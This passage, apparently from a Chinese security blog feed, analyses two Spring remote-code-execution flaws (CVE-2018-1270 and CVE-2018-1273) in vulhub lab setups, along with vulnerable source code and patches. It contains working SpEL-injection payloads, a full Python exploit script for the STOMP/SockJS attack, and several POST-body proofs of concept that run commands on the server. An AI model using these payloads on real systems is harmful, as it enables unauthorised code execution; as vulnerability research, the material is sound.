src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/4.png" alt=""></p><p>篡改报文内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec(&apos;touch /tmp/mi1k7ea&apos;)\n\n\u0000&quot;]</span><br></pre></td></tr></table></figure><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/5.png" alt=""></p><p>再随便输入内容Send，然后就能触发了。</p><h4 id="Method3"><a href="#Method3" class="headerlink" title="Method3"></a>Method3</h4><p>使用P神的脚本就好：<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span><span class="params">(length)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> c <span class="keyword">in</span> range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SockJS</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = <span class="string">f'<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>/<span class="subst">&#123;random_str(<span class="number">8</span>)&#125;</span>'</span></span><br><span class="line">        self.daemon = <span class="keyword">True</span></span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            <span class="string">'Referer'</span>: url,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = <span class="string">f'<span class="subst">&#123;self.base&#125;</span>/htmlfile?c=_jp.vulhub'</span></span><br><span class="line">        response = self.session.get(url, stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> response.iter_lines():</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, command, headers, body=<span class="string">''</span>)</span>:</span></span><br><span class="line">        data = [command.upper(), <span class="string">'\n'</span>]</span><br><span class="line"></span><br><span class="line">        data.append(<span class="string">'\n'</span>.join([<span class="string">f'<span class="subst">&#123;k&#125;</span>:<span class="subst">&#123;v&#125;</span>'</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(<span class="string">'\n\n'</span>)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(<span class="string">'\x00'</span>)</span><br><span class="line">        data = json.dumps([<span class="string">''</span>.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(<span class="string">f'<span class="subst">&#123;self.base&#125;</span>/xhr_send?t=<span class="subst">&#123;self.t&#125;</span>'</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">204</span>:</span><br><span class="line">            logging.info(<span class="string">f"send '<span class="subst">&#123;command&#125;</span>' data error."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.info(<span class="string">f"send '<span class="subst">&#123;command&#125;</span>' data success."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(<span class="string">'http://your-ip:8080/gs-guide-websocket'</span>)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sockjs.send(<span class="string">'connect'</span>, &#123;</span><br><span class="line">    <span class="string">'accept-version'</span>: <span class="string">'1.1,1.0'</span>,</span><br><span class="line">    <span class="string">'heart-beat'</span>: <span class="string">'10000,10000'</span></span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(<span class="string">'subscribe'</span>, &#123;</span><br><span class="line">    <span class="string">'selector'</span>: <span class="string">"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')"</span>,</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'sub-0'</span>,</span><br><span class="line">    <span class="string">'destination'</span>: <span class="string">'/topic/greetings'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;<span class="string">'name'</span>: <span class="string">'vulhub'</span>&#125;)</span><br><span class="line">sockjs.send(<span class="string">'send'</span>, &#123;</span><br><span class="line">    <span class="string">'content-length'</span>: len(data),</span><br><span class="line">    <span class="string">'destination'</span>: <span class="string">'/app/hello'</span></span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure><p>要在Python3环境下才能运行：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/6.png" alt=""></p><p>之后到服务端就看到命令被成功执行了。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>有个注意的地方，如P神说的：</p><blockquote><p>网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。</p><p>连接后端服务器的流程，可以理解为：</p><ol><li>用<a href="http://jmesnil.net/stomp-websocket/doc/" target="_blank" rel="noopener">STOMP协议</a>将数据组合成一个文本流</li><li>用<a href="https://github.com/sockjs/sockjs-client" target="_blank" rel="noopener">sockjs协议</a>发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信</li></ol></blockquote><p>这里就不具体调试分析了，只简单分析下漏洞点，具体的调试分析可参考网上的一些文档即可。</p><p>从补丁的文件开始分析，即spring-messaging/src/main/java/org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java，关键在于addSubscriptionInternal()函数，这里对header参数进行了接收和处理，其中会获取header中的selector，当selector不为空时则设置到expression中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">String sessionId, String subsId, String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Expression expression = <span class="keyword">null</span>;</span><br><span class="line">MessageHeaders headers = message.getHeaders();</span><br><span class="line">String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</span><br><span class="line"><span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</span><br><span class="line"><span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</span><br><span class="line"><span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过<code>sessionId</code>和<code>subsId</code>确定一个<code>selector</code>属性，后续服务端就通过这个<code>subsId</code>来查找特定会话，也就是从<code>headers</code>头部信息查找<code>selector</code>，由<code>selector</code>的值作为expression被执行</p></blockquote><p>前面这是Subscribe操作时设置的selector，我们知道漏洞的触发是在Send之后，接着看下Send之后的函数调用。</p><p>看到org\springframework\messaging\simp\broker\SimpleBrokerMessageHandler.java，其中有个sendMessageToSubscribers()函数，即将我们要发送的数据发送给订阅者，其中参数message保存了此次连接的相关信息，message的头部信息包含了selector的属性，调用了findSubscriptions()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进查看findSubscriptions()函数，位于org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java中，这里将message传进来findSubscriptionsInternal()函数中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> findSubscriptionsInternal(destination, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进findSubscriptionsInternal()函数，位于org\springframework\messaging\simp\broker\DefaultSubscriptionRegistry.java中，这里将message传入了filterSubscriptions()函数进行处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</span><br><span class="line"><span class="keyword">return</span> filterSubscriptions(result, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进filterSubscriptions()函数，同样在DefaultSubscriptionRegistry.java中定义了，该函数获取前面配置的selector来对subscriptions进行过滤选择，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> MultiValueMap&lt;String, String&gt; <span class="title">filterSubscriptions</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">MultiValueMap&lt;String, String&gt; allMatches, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.selectorHeaderInUse) &#123;</span><br><span class="line"><span class="keyword">return</span> allMatches;</span><br><span class="line">&#125;</span><br><span class="line">EvaluationContext context = <span class="keyword">null</span>;</span><br><span class="line">MultiValueMap&lt;String, String&gt; result = <span class="keyword">new</span> LinkedMultiValueMap&lt;&gt;(allMatches.size());</span><br><span class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</span><br><span class="line"><span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</span><br><span class="line">SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Subscription sub = info.getSubscription(subId);</span><br><span class="line"><span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Expression expression = sub.getSelectorExpression();</span><br><span class="line"><span class="keyword">if</span> (expression == <span class="keyword">null</span>) &#123;</span><br><span class="line">result.add(sessionId, subId);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">context = <span class="keyword">new</span> StandardEvaluationContext(message);</span><br><span class="line">context.getPropertyAccessors().add(<span class="keyword">new</span> SimpMessageHeaderPropertyAccessor());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</span><br><span class="line">result.add(sessionId, subId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (SpelEvaluationException ex) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to evaluate selector: "</span> + ex.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to evaluate selector"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析得知，通过<code>Expression expression = sub.getSelectorExpression();</code>来获取前面订阅时设置的Selector表达式，然后在<code>if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class)))</code>代码中调用了expression.getValue()函数，这就是漏洞触发点，成功触发了SpEL表达式注入漏洞。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>官方补丁：<a href="https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a</a></p><p>可以看到主要是修改了DefaultSubscriptionRegistry这个类，用SimpleEvaluationContext来替代了StandardEvaluationContext，也就是采用了SpEL表达式注入漏洞的通用防御方法。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.cnblogs.com/davidwang456/p/4446796.html" target="_blank" rel="noopener">spring源码分析之spring-messaging模块详解</a></p><p><a href="https://www.meetsec.cn/index.php/archives/43/" target="_blank" rel="noopener">IDEA动态调试分析Spring RCE CVE-2018-1270</a></p><p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="noopener">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Data Commons之CVE-2018-1273</title>
    <link href="https://www.mi1k7ea.com/2020/02/03/%E6%B5%85%E6%9E%90Spring-Data-Commons%E4%B9%8BCVE-2018-1273/"/>
    <id>https://www.mi1k7ea.com/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/</id>
    <published>2020-02-03T13:11:16.000Z</published>
    <updated>2020-02-03T15:55:47.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Data-Commons"><a href="#0x01-Spring-Data-Commons" class="headerlink" title="0x01 Spring Data Commons"></a>0x01 Spring Data Commons</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。</p><p>Spring Data Commons是Spring Data下所有子项目共享的基础框架。</p><h2 id="0x02-CVE-2018-1273"><a href="#0x02-CVE-2018-1273" class="headerlink" title="0x02 CVE-2018-1273"></a>0x02 CVE-2018-1273</h2><p>Spring Data Commons在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>2.0.x users should upgrade to 2.0.6</li><li>1.13.x users should upgrade to 1.13.11</li><li>Older versions should upgrade to a supported branch</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接用Vulhub的即可：<a href="https://vulhub.org/#/environments/spring/CVE-2018-1273/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2018-1273/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问目标站点/users接口，是个提交用户名和密码的注册用户的表单，且会在页面中显示出来：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/1.png" alt=""></p><p>提交该表单是如下POST请求：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/2.png" alt=""></p><p>将POST的内容修改为如下PoC再次发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/3.png" alt=""></p><p>此时服务端执行了恶意命令，文件创建成功：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/4.png" alt=""></p><p><strong>其他一些可用的PoC</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 使用JavaScript引擎绕过</span><br><span class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/hacked&apos;)&quot;)]=&amp;password=&amp;repeatedPassword=</span><br><span class="line"></span><br><span class="line">// 使用ProcessBuilder</span><br><span class="line">username[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&apos;foo&apos;.split(&apos;&apos;).getClass()).newInstance(&apos;touchxx/tmp/niubi&apos;.split(&apos;xx&apos;))).start()]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看下漏洞点，下载Spring Data Commons 2.0.5的源码分析。</p><p> 漏洞代码位于org.springframework.data.web.MapDataBinder类中的setPropertyValue()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* (non-Javadoc)</span></span><br><span class="line"><span class="comment">* @see org.springframework.beans.AbstractPropertyAccessor#setPropertyValue(java.lang.String, java.lang.Object)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValue</span><span class="params">(String propertyName, @Nullable Object value)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!isWritableProperty(propertyName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(type, propertyName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">    context.addPropertyAccessor(<span class="keyword">new</span> PropertyTraversingMapAccessor(type, conversionService));</span><br><span class="line">    context.setTypeConverter(<span class="keyword">new</span> StandardTypeConverter(conversionService));</span><br><span class="line">    context.setTypeLocator(typeName -&gt; &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</span><br><span class="line">    &#125;);</span><br><span class="line">    context.setRootObject(map);</span><br><span class="line"></span><br><span class="line">    Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line"></span><br><span class="line">    PropertyPath leafProperty = getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">    TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">    TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line"></span><br><span class="line">    propertyType = propertyName.endsWith(<span class="string">"]"</span>) ? propertyType.getActualType() : propertyType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propertyType != <span class="keyword">null</span> &amp;&amp; conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line"></span><br><span class="line">        PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(),</span><br><span class="line">                                                                        leafProperty.getSegment());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't find PropertyDescriptor for %s on %s!"</span>,</span><br><span class="line">                                                          leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MethodParameter methodParameter = <span class="keyword">new</span> MethodParameter(descriptor.getReadMethod(), -<span class="number">1</span>);</span><br><span class="line">        TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (typeDescriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                String.format(<span class="string">"Couldn't obtain type descriptor for method parameter %s!"</span>, methodParameter));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        value = conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        expression.setValue(context, value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SpelEvaluationException o_O) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(type, propertyName, <span class="string">"Could not write property!"</span>, o_O);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的流程为：</p><ol><li>首先通过isWritableProperty()函数校验propertyName参数（来自表单提交的参数），检测是否为Controller中设置的Form映射对象中的成员变量；</li><li>然后创建一个StandardEvaluationContext，同时调用PARSER.parseExpression()设置需要解析的表达式的值为函数传入的参数；</li><li>最后调用expression.setValue()进行SpEL表达式解析；</li></ol><p>接着跟踪isWritableProperty()函数，查看是如何过滤propertyName参数的，其最终是调用的getPropertyPath()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPath <span class="title">getPropertyPath</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String plainPropertyPath = propertyName.replaceAll(<span 